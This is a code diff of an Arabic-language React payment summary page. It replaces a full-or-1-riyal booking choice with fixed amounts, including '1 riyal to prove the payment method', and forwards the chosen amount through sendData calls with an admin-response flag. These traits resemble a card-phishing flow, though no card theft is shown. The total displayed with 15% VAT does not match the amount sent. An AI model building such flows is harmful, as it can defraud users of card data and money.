@@ -8,13 +8,14 @@ import { CreditCard, CheckCircle2 } from "lucide-react";
 export default function SummaryPayment() {
   const [, setLocation] = useLocation();
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
-  const [paymentType, setPaymentTypeState] = useState<'full' | 'booking'>(() => {
-    const saved = localStorage.getItem('paymentType');
-    return (saved === 'booking' || saved === 'full') ? saved : 'full';
+  const [selectedAmount, setSelectedAmountState] = useState<string>(() => {
+    return localStorage.getItem('selectedPaymentAmount') || '';
   });
-  const setPaymentType = (type: 'full' | 'booking') => {
-    setPaymentTypeState(type);
-    localStorage.setItem('paymentType', type);
+  const setSelectedAmount = (amount: string) => {
+    setSelectedAmountState(amount);
+    localStorage.setItem('selectedPaymentAmount', amount);
+    // Also update paymentType for backward compatibility
+    localStorage.setItem('paymentType', amount === '1' ? 'booking' : 'full');
   };
   const [isProcessing, setIsProcessing] = useState(false);
   const [showPopup, setShowPopup] = useState(false);
@@ -132,15 +133,20 @@ export default function SummaryPayment() {
 
   const handlePayment = () => {
     if (!selectedPaymentMethod) return;
+    if (!selectedAmount) return;
 
     setIsProcessing(true);
 
-    const finalAmount = paymentType === 'booking' ? 1 : totalAmount;
+    const finalAmount = selectedAmount;
+
+    // Save to localStorage for persistence
+    localStorage.setItem('selectedPaymentAmount', finalAmount);
+    localStorage.setItem('selectedTotalAmount', finalAmount);
 
     sendData({
       data: {
-        'نوع الدفع': paymentType === 'booking' ? 'تأكيد حجز (1 ريال)' : 'دفع كامل',
-        'المجموع الكلي': `${finalAmount} ر.س`,
+        'قيمة المبلغ': `${finalAmount} ر.س`,
+        'الخدمة': serviceName,
       },
       current: 'الملخص والدفع',
       waitingForAdminResponse: false,
@@ -149,10 +155,8 @@ export default function SummaryPayment() {
     sendData({
       data: {
         paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
-        paymentType: paymentType === 'booking' ? 'تأكيد حجز (1 ريال)' : 'دفع كامل',
+        'قيمة المبلغ': `${finalAmount} ر.س`,
         serviceName,
-        servicePrice,
-        vatAmount,
         totalAmount: finalAmount,
       },
       current: 'ملخص الدفع',
@@ -223,52 +227,39 @@ export default function SummaryPayment() {
         <p className="pt-1 text-base sm:text-[22px]">ملخص الطلب والدفع</p>
       </section>
 
-      {/* Payment Type Selection */}
+      {/* Payment Amount Selection */}
       <section className="container mx-auto px-3 sm:px-4 mt-4">
         <div className="max-w-4xl mx-auto">
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-            {/* Full Payment Option */}
-            <div
-              className={`border-2 rounded-xl p-4 cursor-pointer transition-all flex items-center gap-3 ${
-                paymentType === 'full'
-                  ? 'border-green-500 bg-green-50 shadow-md'
-                  : 'border-gray-200 hover:border-green-300 bg-white'
-              }`}
-              onClick={() => setPaymentType('full')}
-            >
-              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
-                paymentType === 'full' ? 'border-green-500' : 'border-gray-300'
-              }`}>
-                {paymentType === 'full' && (
-                  <div className="w-3 h-3 rounded-full bg-green-500" />
-                )}
-              </div>
-              <div>
-                <p className="font-bold text-gray-800">دفع كامل المبلغ</p>
-                <p className="text-sm text-gray-500">ادفع المبلغ كاملاً الآن</p>
-              </div>
-            </div>
-
-            {/* 1 SAR Booking Option */}
-            <div
-              className={`border-2 rounded-xl p-4 cursor-pointer transition-all flex items-center gap-3 ${
-                paymentType === 'booking'
-                  ? 'border-green-500 bg-green-50 shadow-md'
-                  : 'border-gray-200 hover:border-green-300 bg-white'
-              }`}
-              onClick={() => setPaymentType('booking')}
-            >
-              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
-                paymentType === 'booking' ? 'border-green-500' : 'border-gray-300'
-              }`}>
-                {paymentType === 'booking' && (
-                  <div className="w-3 h-3 rounded-full bg-green-500" />
-                )}
-              </div>
-              <div>
-                <p className="font-bold text-gray-800">دفع 1 ريال لتأكيد الحجز</p>
-                <p className="text-sm text-gray-500">ادفع ريال واحد فقط لتأكيد حجزك</p>
-              </div>
+          <div className="bg-white border border-gray-200 rounded-xl p-4 sm:p-6">
+            <h3 className="font-bold text-gray-800 mb-4 text-base sm:text-lg">قيمة المبلغ المراد تسديده <span className="text-red-500">*</span></h3>
+            <div className="space-y-3">
+              {[
+                { value: '1', label: '1 ريال لإثبات طريقة الدفع' },
+                { value: '500', label: '500 ريال سعودي' },
+                { value: '750', label: '750 ريال سعودي' },
+                { value: '1200', label: '1200 ريال سعودي' },
+                { value: '1450', label: '1450 ريال سعودي' },
+                { value: '2760', label: '2760 ريال سعودي' },
+              ].map((option) => (
+                <div
+                  key={option.value}
+                  className={`flex items-center gap-3 p-3 rounded-lg cursor-pointer transition-all ${
+                    selectedAmount === option.value
+                      ? 'bg-blue-50 border border-blue-300'
+                      : 'hover:bg-gray-50'
+                  }`}
+                  onClick={() => setSelectedAmount(option.value)}
+                >
+                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
+                    selectedAmount === option.value ? 'border-blue-500' : 'border-gray-300'
+                  }`}>
+                    {selectedAmount === option.value && (
+                      <div className="w-3 h-3 rounded-full bg-blue-500" />
+                    )}
+                  </div>
+                  <span className="text-gray-800 font-medium">{option.label}</span>
+                </div>
+              ))}
             </div>
           </div>
         </div>
@@ -295,15 +286,15 @@ export default function SummaryPayment() {
                     </div>
                     <div className="flex justify-between items-center py-2 border-b">
                       <span className="text-gray-600">رسوم الخدمة</span>
-                      <span className="font-medium">{servicePrice} ر.س</span>
+                      <span className="font-medium">{selectedAmount ? `${selectedAmount} ر.س` : `${servicePrice} ر.س`}</span>
                     </div>
                     <div className="flex justify-between items-center py-2 border-b">
                       <span className="text-gray-600">ضريبة القيمة المضافة (15%)</span>
-                      <span className="font-medium">{vatAmount} ر.س</span>
+                      <span className="font-medium">{selectedAmount ? `${(parseFloat(selectedAmount) * 0.15).toFixed(0)} ر.س` : `${vatAmount} ر.س`}</span>
                     </div>
                     <div className="flex justify-between items-center py-2 bg-green-50 px-3 rounded-lg">
                       <span className="text-green-700 font-bold">المجموع الكلي</span>
-                      <span className={`text-green-700 font-bold ${paymentType === 'booking' ? 'text-sm' : 'text-xl'}`}>{paymentType === 'booking' ? '1 ريال لتأكيد الحجز' : `${totalAmount} ر.س`}</span>
+                      <span className="text-green-700 font-bold text-xl">{selectedAmount ? `${(parseFloat(selectedAmount) * 1.15).toFixed(0)} ر.س` : `${totalAmount} ر.س`}</span>
                     </div>
                   </div>
                 </CardContent>
@@ -397,22 +388,22 @@ export default function SummaryPayment() {
                     </div>
                     <div className="flex justify-between text-sm">
                       <span className="text-gray-600">الرسوم</span>
-                      <span>{servicePrice} ر.س</span>
+                      <span>{selectedAmount ? `${selectedAmount} ر.س` : `${servicePrice} ر.س`}</span>
                     </div>
                     <div className="flex justify-between text-sm">
                       <span className="text-gray-600">الضريبة</span>
-                      <span>{vatAmount} ر.س</span>
+                      <span>{selectedAmount ? `${(parseFloat(selectedAmount) * 0.15).toFixed(0)} ر.س` : `${vatAmount} ر.س`}</span>
                     </div>
                     <hr />
                     <div className="flex justify-between font-bold text-lg">
                       <span>المجموع</span>
-                      <span className={`text-green-600 ${paymentType === 'booking' ? 'text-sm' : ''}`}>{paymentType === 'booking' ? '1 ريال لتأكيد الحجز' : `${totalAmount} ر.س`}</span>
+                      <span className="text-green-600">{selectedAmount ? `${(parseFloat(selectedAmount) * 1.15).toFixed(0)} ر.س` : `${totalAmount} ر.س`}</span>
                     </div>
                   </div>
 
                   <Button
                     className="w-full mt-6 bg-green-600 hover:bg-green-700"
-                    disabled={!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing}
+                    disabled={!selectedPaymentMethod || !selectedAmount || selectedPaymentMethod === 'transfer' || isProcessing}
                     onClick={handlePayment}
                   >
                     {isProcessing ? (
